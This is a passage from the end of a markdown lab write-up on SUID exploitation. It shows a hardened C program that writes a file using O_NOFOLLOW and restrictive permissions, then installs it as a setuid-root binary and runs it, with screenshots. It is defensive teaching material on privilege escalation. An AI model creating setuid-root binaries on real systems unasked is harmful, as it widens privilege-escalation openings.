    int fd = open(safe, O_WRONLY | O_CREAT | O_NOFOLLOW, 0600);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    dprintf(fd, "Data from root\n");
    close(fd);
    return 0;
}
````
<img width="679" height="556" alt="image" src="https://github.com/user-attachments/assets/1c58b1c5-5d3f-42cf-98be-0b78bd170905" />


- To exit Press `Ctrl + O` -> `Enter` -> `Ctrl + X`.


````
gcc secure_write.c -o secure_write
````
<img width="520" height="52" alt="image" src="https://github.com/user-attachments/assets/9407aefc-56ce-4f86-8045-7de0a7d186d3" />



#### Make the binary run with root:
````
sudo chown root:root secure_write
sudo chmod u+s secure_write
ls -la secure_write
````
<img width="563" height="90" alt="image" src="https://github.com/user-attachments/assets/5be1ed20-2fc6-4fb1-a19c-368bbc428bf8" />


#### Run Program:
````
./secure_write
sudo cat /var/lib/myapp/tempfile
````
<img width="526" height="70" alt="image" src="https://github.com/user-attachments/assets/fba4edd8-28bf-4fc8-82d3-462c0a6b5858" />


````
sudo chmod 644 /var/lib/myapp/tempfile
sudo cat /var/lib/myapp/tempfile
````
<img width="586" height="198" alt="image" src="https://github.com/user-attachments/assets/e976d686-19fd-4612-8e84-2074cc80ec91" />

---



<h2 align="center"> Finished Of SUID Exploitation </h2>

<h2 align="center"> Author: Nin Kanong (k4n0ng) </h2>


<h3 align="center"> Date: 3/11/2025 </h3>
